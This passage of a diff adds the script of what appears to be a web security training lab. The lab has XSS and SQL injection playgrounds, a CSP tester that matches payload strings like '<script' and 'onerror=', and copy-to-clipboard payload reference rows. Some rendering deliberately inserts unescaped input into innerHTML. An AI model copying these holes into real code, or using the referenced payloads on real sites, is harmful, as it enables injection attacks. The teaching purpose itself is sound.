+    matched.map(r=>`<tr class="${isInjected?'injected':''}"><td>${r.id}</td><td>${r.username}</td><td>${r.password}</td><td>${r.role}</td></tr>`).join('');
+}
+
+// ─── csp ─────────────────────────────────────────────────────────────────────
+function genNonce() {
+  const arr = new Uint8Array(16);
+  crypto.getRandomValues(arr);
+  cspNonce = btoa(String.fromCharCode(...arr));
+  document.getElementById('csp-nonce').value = cspNonce;
+  updateCspPreview();
+}
+
+function updateCspPreview() {
+  const s = document.getElementById('csp-script-src').value;
+  const d = document.getElementById('csp-default-src').value;
+  const i = document.getElementById('csp-img-src').value;
+  const n = cspNonce ? ` 'nonce-${cspNonce.slice(0,10)}…'` : '';
+  document.getElementById('csp-preview').textContent =
+    `Content-Security-Policy: default-src ${d}; script-src ${s}${n}; img-src ${i}`;
+}
+
+function checkCsp() {
+  const payload = document.getElementById('csp-payload').value.toLowerCase();
+  const scriptSrc = document.getElementById('csp-script-src').value;
+  const out = document.getElementById('csp-result');
+  let verdict = '';
+  const hasInlineScript = payload.includes('<script') || payload.includes('onerror=') ||
+    payload.includes('onload=') || payload.includes('onfocus=') || payload.includes('onclick=');
+  const hasEval = payload.includes('eval(') || payload.includes('settimeout(');
+  const hasUnsafeInline = scriptSrc.includes('unsafe-inline') || scriptSrc === '*';
+  const hasUnsafeEval  = scriptSrc.includes('unsafe-eval') || scriptSrc === '*';
+
+  if (scriptSrc === "'none'") {
+    verdict = '🛡️ BLOCKED — script-src: none prevents all scripts';
+    out.className = 'output';
+    out.style.color = 'var(--green)';
+  } else if (hasInlineScript && !hasUnsafeInline) {
+    verdict = '🛡️ BLOCKED — inline scripts/handlers need unsafe-inline to execute';
+    out.className = 'output';
+    out.style.color = 'var(--green)';
+  } else if (hasEval && !hasUnsafeEval) {
+    verdict = '🛡️ BLOCKED — eval requires unsafe-eval';
+    out.className = 'output';
+    out.style.color = 'var(--green)';
+  } else if (hasInlineScript && hasUnsafeInline) {
+    verdict = '⚠️ ALLOWED — unsafe-inline permits this payload (CSP weakness)';
+    out.className = 'output warn';
+    out.style.color = '';
+  } else if (scriptSrc === '*') {
+    verdict = '🚨 ALLOWED — wildcard script-src, effectively no protection';
+    out.className = 'output error';
+    out.style.color = '';
+  } else {
+    verdict = '✅ This specific payload is likely blocked by the current policy';
+    out.className = 'output';
+    out.style.color = 'var(--green)';
+  }
+  out.textContent = verdict;
+}
+
+// ─── payload chips ───────────────────────────────────────────────────────────
+function makeChips(containerId, payloads, inputId) {
+  const c = document.getElementById(containerId);
+  c.innerHTML = payloads.map(p =>
+    `<span class="chip" title="${p}" onclick="setPayload('${inputId}','${p.replace(/'/g,"\\'")}');copyText('${p.replace(/'/g,"\\'")}');">${
+      p.length > 40 ? p.slice(0,38)+'…' : p
+    }</span>`
+  ).join('');
+}
+
+function makePayloadRows(containerId, payloads) {
+  const c = document.getElementById(containerId);
+  c.innerHTML = payloads.map(p =>
+    `<div style="display:flex;align-items:center;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border)">
+      <code style="flex:1;margin-right:12px;word-break:break-all">${escapeHtml(p)}</code>
+      <button class="btn btn-muted" onclick="copyText('${p.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')" style="padding:4px 10px;font-size:11px;flex-shrink:0">Copy</button>
+    </div>`
+  ).join('');
+}
+
+function setPayload(inputId, val) {
+  const el = document.getElementById(inputId);
+  if (el) el.value = val;
+}
+
+function copyText(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    const t = document.getElementById('copy-toast');
+    if (t) { t.style.opacity = '1'; setTimeout(()=>t.style.opacity='0', 1500); }
+  });
+}
+
+// ─── sqli quick payloads ─────────────────────────────────────────────────────
+function makeSqliChips() {
+  const c = document.getElementById('sqli-payloads');
+  const all = [...PAYLOADS.sqliLogin, ...PAYLOADS.sqliUnion, ...PAYLOADS.sqliBlind];
+  c.innerHTML = all.map(p =>
+    `<span class="chip" onclick="document.getElementById('sqli-user').value='${p.replace(/'/g,"\\'")}';document.getElementById('sqli-search').value='${p.replace(/'/g,"\\'")}'">${
+      p.length > 40 ? p.slice(0,38)+'…' : p
+    }</span>`
+  ).join('');
+}
+
+// ─── init ─────────────────────────────────────────────────────────────────────
+(function init() {
+  // reflected quick payloads
+  makeChips('reflect-payloads', PAYLOADS.xssBasic, 'reflect-input');
+
+  // dom initial render
+  updateDomPreview();
+
+  // db table
+  renderDbTable();
+
+  // sqli chips
+  makeSqliChips();
+
+  // csp
+  genNonce();
+  updateCspPreview();
+
+  // payload reference
+  makePayloadRows('payload-xss-basic',   PAYLOADS.xssBasic);
+  makePayloadRows('payload-xss-bypass',  PAYLOADS.xssBypass);
+  makePayloadRows('payload-sqli-login',  PAYLOADS.sqliLogin);
+  makePayloadRows('payload-sqli-union',  PAYLOADS.sqliUnion);
+  makePayloadRows('payload-sqli-blind',  PAYLOADS.sqliBlind);
+})();
+</script>
+</body>
+</html>
